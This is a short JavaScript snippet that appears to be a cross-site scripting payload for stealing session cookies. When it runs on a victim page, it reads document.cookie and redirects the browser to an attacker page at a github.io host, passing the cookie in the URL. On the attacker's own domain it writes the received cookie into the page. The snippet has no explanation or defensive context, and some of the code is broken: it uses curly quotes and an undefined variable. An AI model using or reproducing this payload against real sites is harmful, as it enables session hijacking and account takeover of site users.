if(location.host == “my_own_domain”){ 
    Url = new URL(document.location); 
    Parameters = new URLSearchParams(x.search); 
    cookie = Parameters.get(“cookie”); 
    document.write(cookie);
}
else{ 
    var cookie = document.cookie; 
document.location=“https://hostheader.github.io/attacker.html?cookie="+cookie;
}
